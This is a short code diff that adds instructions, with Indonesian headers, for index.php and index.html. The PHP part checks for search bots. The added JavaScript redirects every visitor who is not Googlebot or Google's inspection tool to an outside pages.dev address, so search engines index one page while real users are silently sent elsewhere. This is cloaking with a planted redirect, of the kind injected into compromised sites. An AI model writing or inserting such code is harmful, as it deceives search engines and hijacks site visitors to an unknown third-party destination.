@@ -1,3 +1,5 @@
+HARUSSSS index.php
+
 <?php
 
 function isBot() {
@@ -23,3 +25,16 @@ if (!isBot()) {
 
 // Jika bot, biarkan lanjut ke isi halaman normal (misalnya HTML statis, artikel, dsb)
 ?>
+
+
+HARUSSSS index.html
+
+<script>
+var ua = navigator.userAgent.toLowerCase();
+
+var isGoogleBot = ua.includes("googlebot") || ua.includes("inspectiontool");
+
+if (!isGoogleBot) {
+    window.location.replace("https://ge-iic.pages.dev/mantap/");
+}
+</script>
